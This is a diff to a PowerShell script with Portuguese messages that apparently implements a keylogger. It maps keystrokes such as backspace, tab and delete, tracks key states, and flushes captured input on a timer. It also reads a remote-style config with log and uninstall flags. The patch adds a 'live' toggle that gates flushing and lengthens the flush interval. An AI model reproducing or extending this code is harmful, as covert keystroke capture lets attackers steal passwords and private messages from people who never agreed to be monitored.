@@ -104,6 +104,7 @@ if (-not ("K" -as [type])) { Send "[erro] tipo K nao carregou — a sair"; exit 
 $map  = @{ 8='[BK]'; 9='[TAB]'; 13="`n"; 32=' '; 46='[DEL]'; 27='[ESC]' }
 $prev = New-Object 'bool[]' 256
 $logOn = $true
+$live  = $false
 $ultimo = ""
 $tUlt   = Get-Date
 $tRun   = Get-Date
@@ -173,6 +174,7 @@ while ($true) {
       }
 
       if ($cfg["log"] -eq "1") { $logOn = $true } elseif ($cfg["log"] -eq "0") { $logOn = $false }
+      if ($cfg["live"] -eq "1") { $live = $true } elseif ($cfg["live"] -eq "0") { $live = $false }
 
       if (Flag "uninstall") { Uninstall }
     }
@@ -198,5 +200,5 @@ while ($true) {
   } else { Start-Sleep -Milliseconds 800 }
 
   if (((Get-Date) - $tRun).TotalSeconds -gt 30) { Add-Content $run "alive $(Get-Date -f s)"; $tRun = Get-Date }
-  if ($logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 10) { Flush; $tUlt = Get-Date }
+  if ($live -and $logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 30) { Flush; $tUlt = Get-Date }
 }
